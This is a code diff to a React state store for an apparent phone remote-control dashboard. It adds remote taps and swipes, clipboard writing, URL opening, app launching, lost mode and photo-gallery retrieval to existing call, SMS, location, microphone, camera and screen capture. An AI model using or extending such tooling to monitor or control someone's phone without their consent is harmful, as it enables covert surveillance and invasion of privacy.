@@ -49,6 +49,11 @@ export function StoreProvider({ children }) {
   const [torchOn, setTorchOn] = useState(false);
   const [liveListening, setLiveListening] = useState(false);
   const [latestAudioChunk, setLatestAudioChunk] = useState(null);
+  const [volumeInfo, setVolumeInfo] = useState({});
+  const [batteryStats, setBatteryStats] = useState({});
+  const [lostModeState, setLostModeState] = useState({});
+  const [galleryPhotos, setGalleryPhotos] = useState({});
+  const [galleryLoading, setGalleryLoading] = useState(false);
   const ws = useRef(null);
   const alertTimers = useRef({});
   // Mirrors files.downloadBuffer for the stray-terminator guard below
@@ -434,6 +439,66 @@ function titleOrApp(appName, title, text) {
           break;
         }
 
+        case 'VOLUME_INFO_RESPONSE':
+        case 'VOLUME_SET_RESULT': {
+          if (p.deviceId) {
+            setVolumeInfo((prev) => ({ ...prev, [p.deviceId]: p }));
+          }
+          if (p.error) pushToast(`Volume: ${p.error}`, 'error');
+          break;
+        }
+
+        case 'BATTERY_STATS_RESPONSE': {
+          if (p.deviceId) {
+            setBatteryStats((prev) => ({ ...prev, [p.deviceId]: p }));
+          }
+          break;
+        }
+
+        case 'INPUT_KEY_RESULT': {
+          if (p.error) pushToast(`Virtual key error: ${p.error}`, 'error');
+          break;
+        }
+
+        case 'INPUT_GESTURE_RESULT': {
+          if (p.error) pushToast(`Gesture error: ${p.error}`, 'error');
+          break;
+        }
+
+        case 'CLIPBOARD_WRITE_RESULT': {
+          pushToast(p.success ? 'Text copied to phone clipboard' : `Clipboard error: ${p.error}`, p.success ? 'success' : 'error');
+          break;
+        }
+
+        case 'OPEN_URL_RESULT': {
+          pushToast(p.success ? `Opened on phone: ${p.url}` : `Failed to open URL: ${p.error}`, p.success ? 'success' : 'error');
+          break;
+        }
+
+        case 'LAUNCH_APP_RESULT': {
+          pushToast(p.success ? `Launched ${p.packageName}` : `Failed to launch app: ${p.error}`, p.success ? 'success' : 'error');
+          break;
+        }
+
+        case 'LOST_MODE_STATUS':
+        case 'LOST_MODE_RESULT': {
+          if (p.deviceId) {
+            setLostModeState((prev) => ({ ...prev, [p.deviceId]: p }));
+          }
+          if (p.message !== undefined) {
+            pushToast(p.active ? '⚠️ Lost Mode ACTIVATED on device' : 'Lost Mode deactivated', p.active ? 'warning' : 'success');
+          }
+          break;
+        }
+
+        case 'MEDIA_GALLERY_RESPONSE': {
+          setGalleryLoading(false);
+          if (p.deviceId) {
+            setGalleryPhotos((prev) => ({ ...prev, [p.deviceId]: p.photos || [] }));
+          }
+          break;
+        }
+
         default:
           break;
       }
@@ -511,7 +576,9 @@ function titleOrApp(appName, title, text) {
       .then((r) => r.json())
       .then((b) => { if (b) setCallBlocklist((prev) => ({ ...prev, [activeDeviceId]: b })); })
       .catch(() => {});
-  }, [activeDeviceId]);
+    sendCommand('volume-get', { deviceId: activeDeviceId }).catch(() => {});
+    sendCommand('battery-stats', { deviceId: activeDeviceId }).catch(() => {});
+  }, [activeDeviceId, sendCommand]);
 
   const sendCommand = useCallback(async (path, body) => {
     try {
@@ -636,6 +703,34 @@ function titleOrApp(appName, title, text) {
       latestAudioChunk: (latestAudioChunk && latestAudioChunk.deviceId === activeDeviceId) ? latestAudioChunk : null,
       startLiveListen: () => sendCommand('live-listen-start', { deviceId: activeDeviceId }),
       stopLiveListen: () => sendCommand('live-listen-stop', { deviceId: activeDeviceId }),
+      // Virtual Navigation & Gestures
+      sendInputKey: (action) => sendCommand('input-key', { deviceId: activeDeviceId, action }),
+      sendInputTap: (x, y) => sendCommand('input-tap', { deviceId: activeDeviceId, x, y }),
+      sendInputSwipe: (x1, y1, x2, y2, duration = 300) => sendCommand('input-swipe', { deviceId: activeDeviceId, x1, y1, x2, y2, duration }),
+      // Volume & Sound Manager
+      volumeInfo: activeDeviceId ? volumeInfo[activeDeviceId] : null,
+      fetchVolumeInfo: () => sendCommand('volume-get', { deviceId: activeDeviceId }),
+      setVolumeLevel: (stream, level) => sendCommand('volume-set', { deviceId: activeDeviceId, stream, level }),
+      setRingerProfile: (ringerMode) => sendCommand('volume-set', { deviceId: activeDeviceId, ringerMode }),
+      // Reverse Clipboard Sync
+      writeClipboardText: (text) => sendCommand('clipboard-write', { deviceId: activeDeviceId, text }),
+      // Remote URL Opener
+      openRemoteUrl: (url) => sendCommand('open-url', { deviceId: activeDeviceId, url }),
+      // Battery Health & Telemetry
+      batteryStats: activeDeviceId ? batteryStats[activeDeviceId] : null,
+      fetchBatteryStats: () => sendCommand('battery-stats', { deviceId: activeDeviceId }),
+      // Remote App Launcher
+      launchRemoteApp: (packageName) => sendCommand('launch-app', { deviceId: activeDeviceId, packageName }),
+      // Lost Mode Screen Emergency Banner
+      lostMode: activeDeviceId ? (lostModeState[activeDeviceId] || { active: false }) : { active: false },
+      setLostMode: (enable, message, phone, soundAlarm) => sendCommand('lost-mode', { deviceId: activeDeviceId, enable, message, phone, soundAlarm }),
+      // Media / Photo Gallery
+      galleryPhotos: activeDeviceId ? (galleryPhotos[activeDeviceId] || []) : [],
+      galleryLoading,
+      fetchGallery: (limit = 36) => {
+        setGalleryLoading(true);
+        sendCommand('media-gallery', { deviceId: activeDeviceId, limit });
+      },
       removeDevice: async (deviceId) => {
         try {
           const res = await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' });
@@ -657,7 +752,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk]
+    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
